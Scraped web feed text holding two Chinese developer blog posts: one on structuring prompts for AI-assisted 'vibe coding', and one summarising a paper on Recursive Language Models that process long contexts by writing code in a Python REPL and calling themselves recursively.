            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248168660742797/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    A小码哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:54:22.000Z" title="Mon Jan 12 2026 12:54:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vibe Coding 提示词优化的四个实战策略</h2>
<p>大家好我是小码哥，前鹅厂下岗赛道不出名研发工程师。</p>
<p>前些天有粉丝和我讨论说 GLM 4.7 不行，现在都是用Cluade Code Opus 4.5。当然行业龙头，工程化和代码质量、效率都是风向标一样的存在。大家当然喜欢。在AI大模型爆发的今天，cluade 不是唯一选项，GPT-5.2、Gemini-3-Pro、Kimi-K2、GLm 4.7、Qwen3 Coder、甚至 DeepSeek-3.2 都是不错的模型。除了模型知否支持多模态处理这个鸿沟，在编码上我理解正常的需求开发模型之间差别没有想象的那么大。我现在还没有遇到一个需求要写几个小时的情况，也没有遇到那么强的场景需要从plan -&gt; deploy 整个完整流程的诉求。大部分时候自己作为一个PM来规划、设计整个研发过程。</p>
<p>下面来给大家分享一些，我的一些理解技巧。所谓的 Vibe Coding（氛围编码），本质上是开发者将精力从“如何写代码”转向“想要什么结果”的思维跃迁。在这种模式下，提示词（Prompt）不再是简单的指令，而是一份<strong>产品需求文档 + 架构设计书</strong>。以下是一份精心编写的 Vibe Coding 提示词实战的攻略，如果有不对的地方欢迎大家一起来交流。</p>
<hr/>
<h3 data-id="heading-1">一、 Vibe Prompt 的大体结构（万能模版）</h3>
<p>一份高质量的 Vibe 提示词应遵循 <strong>"R-G-C-S"</strong> 结构，确保 AI 既懂你的意图，又懂技术边界。</p>






























<table><thead><tr><th>组成部分</th><th>核心内容</th><th>示例</th></tr></thead><tbody><tr><td><strong>角色定义 (Role)</strong></td><td>指定 AI 的身份、专家级别和风格。</td><td>“你是一位精通 React 和 Tailwind CSS 的高级前端专家。”，当前可用作为rule写在项目配置里。</td></tr><tr><td><strong>任务目标 (Goal)</strong></td><td>明确你要构建什么，以及最终交付的形式。</td><td>“构建一个具有 Apple 风格的毛玻璃效果音乐播放器。”</td></tr><tr><td><strong>背景上下文 (Context)</strong></td><td>现有的技术栈、运行环境、已有的文件。</td><td>“使用 Next.js 14 App Router，已经安装了 Lucide-react 图标库。”</td></tr><tr><td><strong>规范约束 (Spec/Constraints)</strong></td><td>必须遵守的代码风格、逻辑约束、视觉要求。</td><td>“不要使用外部 UI 库；响应式设计；必须包含深色模式。”</td></tr></tbody></table>
<p>一段话提示词</p>
<pre><code class="hljs language-md" lang="md">【背景】当前项目页面新开发一个功能函数。【上下文】在<span class="hljs-code">`Video\index.tsx`</span> 中，新增一个函数，函数在第277行执行调用。【约束过程】如果 dataObj.data 下面的 videoStatus、headStatus、videoFrontStatus 、videoBackStatus、concatStatus 属性如果任意一个等于 3 ，则停止轮询，执行 tryonService.initTryonParams() 否则继续轮询
</code></pre>
<p>执行效果：
<img src="https://fastly.jsdelivr.net/gh/bucketio/img13@main/2026/01/12/1768220856314-faca5aca-2125-4817-ae83-1a79715390a5.png" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-2">二、 核心思路：从“过程”转向“结果”</h3>
<p>在写提示词时，你需要从 <strong>“命令式”</strong> 转向 <strong>“声明式”</strong>：</p>
<p><img src="https://fastly.jsdelivr.net/gh/bucketio/img14@main/2026/01/12/1768221150610-fe089c6e-345c-4d32-85f4-bb61203ba331.png" alt="" loading="lazy"/></p>
<ol>
<li><strong>描述“感觉”而非“步骤”</strong>：不要说“创建一个 div 并设置边距”，而要说“创建一个布局，感觉既专业又极简，像 Linear 或 Stripe 的官网”。</li>
<li><strong>提供视觉基准</strong>：Vibe Coding 强调审美。在提示词中加入“极简主义”、“赛博朋克”、“Bento Grid 布局”等词汇，能快速拉近 AI 与你脑中画面的距离。</li>
<li><strong>模块化思维</strong>：即使是 Vibe Coding，也不建议一次性写 5000 行代码。将大需求拆分成“核心交互”、“数据逻辑”、“视觉打磨”三个阶段编写提示词。</li>
</ol>
<hr/>
<h3 data-id="heading-3">三、 提示词的优化技巧</h3>
<p>当 AI 生成的结果“差点意思”时，尝试以下优化手段：
<img src="https://fastly.jsdelivr.net/gh/bucketio/img6@main/2026/01/12/1768219924752-b6891e73-72cc-4d84-9531-ae80085ff0ce.png" alt="分点说明" loading="lazy"/></p>
<ul>
<li><strong>思维链触发 (Chain of Thought)</strong>：在提示词末尾加上 <code>“在开始编写代码前，请先简要说明你的实现思路”</code>。这能强制 AI 进行逻辑推演，减少低级错误。</li>
<li><strong>示例注入 (Few-Shot)</strong>：如果你有心仪的代码片段或样式，直接贴给它：<code>“请参考这个代码的交互风格：[粘贴代码]”</code>。</li>
<li><strong>负向约束 (Negative Prompting)</strong>：明确告诉它<strong>不要</strong>做什么。例如：<code>“不要使用类组件”、“不要添加多余的注释”、“不要引入第三方状态管理库”</code>。</li>
<li><strong>引入反馈环</strong>：告诉 AI：<code>“如果你对需求有任何不确定的地方，请在编写代码前先询问我。”</code></li>
</ul>
<hr/>
<h3 data-id="heading-4">四、 审查与持续迭代</h3>
<p>Vibe Coding 并不是“一锤子买卖”，而是一个<strong>不断对话、不断纠偏</strong>的过程。</p>
<h4 data-id="heading-5">1. 自动化审查</h4>
<ul>
<li><strong>运行报错直接回传</strong>：遇到报错不要慌，直接把错误日志丢给 AI，问它：<code>“这是目前的报错，请分析根本原因并修复。”</code></li>
<li><strong>代码 Review 提示词</strong>：在功能实现后，追加一个提示词：<code>“从性能、可读性和安全性角度检查上述代码，并给出优化方案。”</code></li>
</ul>
<p><img src="https://fastly.jsdelivr.net/gh/bucketio/img6@main/2026/01/12/1768221063161-af6adf9b-3d85-4033-96c2-7f471a86bd95.png" alt="给定跑错信息，分析错误" loading="lazy"/></p>
<h4 data-id="heading-6">2. 持续迭代路径</h4>
<ul>
<li><strong>第一步：原型 (The Soul)</strong> —— 只关注核心功能是否跑通。</li>
<li><strong>第二步：修饰 (The Body)</strong> —— 调整 UI、动效、适配性。</li>
<li><strong>第三步：重构 (The Spirit)</strong> —— 让 AI 优化冗余代码，提取公共组件。</li>
</ul>
<p><img src="https://fastly.jsdelivr.net/gh/bucketio/img1@main/2026/01/12/1768221226837-0e916354-19ec-48fb-8c21-565237058055.png" alt="" loading="lazy"/></p>
<blockquote>
<p>如果 AI 陷入了逻辑死循环（反复修不好一个 Bug），最好的办法是<strong>开启一个全新的对话窗口</strong>，并将当前最新的代码和明确的单一目标重新喂给它。</p>
</blockquote>
<p>如果有什么问题可用有什么想法，可用留言讨论。也可以关注公众号 “A小码哥”向我咨询。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Google DeepMind ：RAG 已死，无限上下文是伪命题？RLM 如何用“代码思维”终结 AI 的记忆焦虑]]></title>    <link>https://juejin.cn/post/7594302398687330358</link>    <guid>https://juejin.cn/post/7594302398687330358</guid>    <pubDate>2026-01-13T03:00:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594302398687330358" data-draft-id="7594389431835082793" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Google DeepMind ：RAG 已死，无限上下文是伪命题？RLM 如何用“代码思维”终结 AI 的记忆焦虑"/> <meta itemprop="keywords" content="前端,AI编程,Flutter"/> <meta itemprop="datePublished" content="2026-01-13T03:00:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="恋猫de小郭"/> <meta itemprop="url" content="https://juejin.cn/user/817692379985752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Google DeepMind ：RAG 已死，无限上下文是伪命题？RLM 如何用“代码思维”终结 AI 的记忆焦虑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692379985752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    恋猫de小郭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:00:14.000Z" title="Tue Jan 13 2026 03:00:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>不久前 DeepMind 发布了一篇论文，内容简单说是： <strong>RLM（Recursive Language Models） 不是让模型“硬记”所有内容，而是赋予模型像程序员一样操作数据的能力</strong>，让模型在<strong>不把超长 prompt 直接塞进 Transformer</strong> 的情况下，仍然能完成需要密集访问长文本的任务。</p>
<p>也就是它不再试图将所有内容塞进有限的“大脑”（上下文窗口），而是将长文本视为一个“数据库”，模型可以通过编写代码（Python REPL）来递归地检索、切片和阅读它需要的部分。</p>
<blockquote>
<p>在这里，RLM 属于<strong>通用推理范式</strong> 。</p>
</blockquote>
<p>在目前，各大模型厂商都在搞“军备竞赛”，100万、1000万 token 的上下文窗口数据理论上看着很美好，但是在实际使用过程中，相信大家有所体会，当上下文超过一定长度（100k）后，模型的性能会急剧下降，因为模型并不是真的“记住”了 1000万字，它只是把它们塞进去了，<strong>但通过注意力机制在找回信息时会变得混乱和遗忘</strong>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e935c79f6f04927bb144185398b6132~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878014&amp;x-signature=23DWc%2FUWBE7sSRYC%2Bki%2FucpUmXM%3D" alt="" loading="lazy"/></p>
<p>所以 RAG (检索增强生成) 是目前的主流补丁方案，它把长文档切成小块（Chunks）存入数据库，当用户提问时，系统检索相关的碎片塞给模型。</p>
<p>但是这种场景下，<strong>RAG 容易丢失全局上下文</strong> ，如果一个任务需要同时理解文档的第 1 章和第 10 章的关联，或者需要进行跨段落的复杂推理，RAG 很容易出现失败，因为它只能看到碎片，看不到全貌（“Lost Context”）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0b9ec1da8764288b200c2b70295747a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878014&amp;x-signature=UwsZLsOFqu8%2BX0F2r01OrSehS6c%3D" alt="" loading="lazy"/></p>
<p>而对于 RLM 而言，它不再是一个碎片“阅读者”，而是变成了一个“操作对象”，模型不直接阅读 1000万 token 的文本，而是将整个长文本被作为一个<strong>变量 (String Variable)</strong> 加载到 Python 交互式环境（REPL）中，之后进行递归和代码执行：</p>
<ul>
<li>模型可以编写代码来处理文本，比如写 <code>grep</code> (搜索关键词)，<code>slice</code> (切片读取某一段)，或者使用正则 (Regex) 来定位信息</li>
<li>如果模型切片出了一段内容，发现里面还有需要深入挖掘的信息，它会调用自身（Recursive Call）来处理那个特定内容，也就是递归</li>
</ul>
<blockquote>
<p>简单来说，整个流程就是：提问 -&gt; 模型写代码搜索 -&gt; 找到片段 -&gt; (如果需要) 递归调用自身分析片段 -&gt; 汇总答案。</p>
</blockquote>
<p>那说它比 RAG 好的地方是什么？可以简单来说，它会像人类一样阅读：</p>
<ul>
<li>当人类需要阅读一本巨厚的书，比如各种字典，肯定不会从头到尾背下来，相反肯定会用目录、用 <code>Ctrl+F</code>、做笔记、跳读等方式</li>
<li>RLM 的存在就是让 AI 这么做，<strong>它不是靠“注意力机制”去死记硬背</strong>，而是靠“逻辑导航”去随时调取它需要的任何细节</li>
</ul>
<p>因为是通过代码精确查找和读取，所以只要文本在那儿，它就永远不会“遗忘”，这就是 RLM 里所谓的“完美记忆”，在这一个程度去理解，<strong>RLM 是主动的，模型自己决定要去读哪一段，自己验证找得对不对，如果不通过，它会修正搜索策略</strong>。</p>
<p>比如，论文里提供的数据:</p>
<ul>
<li>在 OOLONG-Pairs 密集推理任务上，传统 RAG 准确率只有 0.04%，而 RLM 高达 58%</li>
<li>在多文档研究 BrowseComp+ 上，RLM 从 0% 提升到了 91%</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/accc27325aae453985e24ce2fa976685~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878014&amp;x-signature=JqgvHm8M2ovZg95jzKrOUH7EDWM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>RLM 的做法是：把密集语义理解分摊给多个子调用、每次子调用只看较小片段，减少在超长上下文里“越看越糊”。</p>
</blockquote>
<p>而这篇论文最有意思的发现之一是：<strong>不需要专门训练</strong> ，研究人员并没有重新训练 GPT-5 或 Qwen3-Coder ，他们只是给了现有的模型一个 Python 环境和递归访问权限， 然后模型就自己学会了策略，它们开始自己写正则表达式来过滤上下文，自己把大任务拆解成递归的小任务，<strong>这是一种零样本（Zero-shot）的策略涌现</strong>，模型自己“悟”出了策略：</p>
<ul>
<li>它自己决定：“这段文本太长，我不能直接读，我要先用正则过滤一下。”</li>
<li>它自己学会了：“我不确定这个答案对不对，我要写一段代码去原文里再验证一次。”</li>
</ul>
<blockquote>
<p>这意味着<strong>高智商模型天生具备处理无限信息的能力</strong>，只是之前的交互界面（Chat Interface）限制了它们。</p>
</blockquote>
<p>论文里提到，RLM 能处理<strong>超过模型窗口两个数量级</strong>的输入，并且在多个长上下文任务上比 base LLM 和常见脚手架明显更强，且单次查询成本可相当甚至更低，也就是：</p>
<blockquote>
<p>RLM 在“长+密”的任务上优势明显，并且把处理长度推到 10M+ tokens 。</p>
</blockquote>
<p>从这里可以看到， 虽然递归看起来步骤多，但实际上比把 1000万 token 一次性塞进上下文窗口要便宜，因为模型只读取它通过代码筛选出的那几千个关键 token，而不是为处理数百万无关 token 支付额外费用，更具体的场景例如：</p>
<ul>
<li>分析整个代码库（不再受限于窗口）</li>
<li>理解并综合数百篇研究论文</li>
<li>处理长达多年的医疗记录</li>
</ul>
<p>当然也不不是没有限制，比如：</p>
<ul>
<li><strong>同一套系统提示词跨模型会出问题</strong>：Qwen3-Coder 更“放飞”地滥用子调用，所以他们不得不单独加一句“少用 sub-calls、尽量 batch”</li>
<li><strong>模型代码能力不足会直接崩</strong>：因为这个范式强依赖“写代码操作 context”</li>
<li><strong>输出 token/思考 token 不够会跑不完</strong>：长轨迹 + 多轮 REPL 需要足够输出上限</li>
<li><strong>没有异步子调用会很慢</strong>：他们实现是 blocking/sequential，导致运行时间长，作者认为工程上可解决</li>
<li><strong>终止信号（FINAL）很脆弱</strong>：模型会把计划当最终答案、或 FINAL_VAR 不被接受等。</li>
</ul>
<p>也就是，RLM 作为“纯提示词+系统编排”的推理范式已经有效，但要变成稳定产品，需要：</p>
<ul>
<li>更强的执行/并发工程</li>
<li>更针对性的训练或对齐</li>
</ul>
<blockquote>
<p>论文也在附录提到，他们实现 sub-calls 是串行 blocking 的，也没做“预算控制/批量/缓存”优化，而且模型有时会“过度验证”，导致多余子调用。</p>
</blockquote>
<p>这样才能让模型学会在这种协议下更好工作，另外论文提到，<strong>在超高难度组合任务 RLM更贵，但性价比高</strong>，因为虽然开销大了，但是准确率可以提高不少，目前看来：</p>
<blockquote>
<p>当任务需要密集访问长文本，并且证据分散在很多段落/文档时，RLM 可以做到更准更省。</p>
</blockquote>
